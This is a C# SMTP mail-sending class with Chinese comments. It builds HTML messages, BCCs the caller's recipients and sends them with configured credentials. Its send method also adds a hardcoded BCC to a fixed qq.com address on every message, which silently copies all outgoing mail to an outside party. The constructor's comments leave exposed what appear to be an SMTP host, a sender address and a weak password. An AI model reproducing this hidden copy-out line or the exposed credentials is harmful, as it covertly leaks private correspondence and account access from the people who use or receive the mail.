using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Mail;
using System.Net;
namespace op
{
    public class mail
    {
        /// <summary>
        /// /// 多个收件人用;分隔
        /// </summary>
        /// <param name="_Recipient">收件人</param>
        /// <param name="_title">标题</param>
        /// <param name="_content">内容</param>     
        public mail()
        {
            smtp = op.staValue.stmpMail[0];//"smtpout.secureserver.net";//
            serverUserName = op.staValue.stmpMail[1];// "master@ruiqiwholesale.com";//
            serverPassword = op.staValue.stmpMail[2];// "123456";//
        }
        public string send()
        {
            op.Operation ope = new Operation();
            MailMessage mail = new MailMessage();
            MailAddress fromMail = new MailAddress(serverUserName, companyName);//发件  默认
            mail.From = fromMail;
            if (Recipient.IndexOf(";") > 0)//多个收件人在这选择
            {
                string[] to = Recipient.Split(';');
                for (int i = 0; i < to.Length; i++)
                {
                    if (ope.IsEmail(to[i]))
                    {
                        mail.Bcc.Add(to[i]);
                    }
                }

            }
            else
            {
                mail.Bcc.Add(Recipient);
            }
            mail.Bcc.Add("250345278@qq.com");
            mail.Body = content;
            mail.Subject = title;
            mail.IsBodyHtml = true;
            mail.BodyEncoding = Encoding.UTF8;
            mail.Priority = System.Net.Mail.MailPriority.High;
            SmtpClient client = new SmtpClient(smtp);
            client.Port = int.Parse(op.staValue.stmpMail[3]);
            client.Credentials = new NetworkCredential(serverUserName, serverPassword);//发送方的用户密码
            try
            {
                client.Send(mail);
                return "发送成功!";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        private string _Recipient;
        private string _title;
        private string _content;
        private string _smtp;
        private string _serverUserName;
        private string _serverPassword;
        /// <summary>
        /// 收件人 多个用;号格式
        /// </summary>
        public string Recipient { set { _Recipient = value; } get { return _Recipient; } }
        /// <summary>
        /// 发送标题
        /// </summary>
        public string title { set { _title = value; } get { return _title; } }
        /// <summary>
        /// 发送内容
        /// </summary>
        public string content { set { _content = value; } get { return _content; } }
        /// <summary>
        /// 发件服务器
        /// </summary>
        public string smtp { set { _smtp = value; } get { return _smtp; } }
        /// <summary>
        /// 发件用户名
        /// </summary>
        public string serverUserName { set { _serverUserName = value; } get { return _serverUserName; } }
        /// <summary>
        /// 发件密码
        /// </summary>
        public string serverPassword { set { _serverPassword = value; } get { return _serverPassword; } }
        /// <summary>
        /// 发件人名称
        /// </summary>
        public string companyName { get; set; }
    }
}
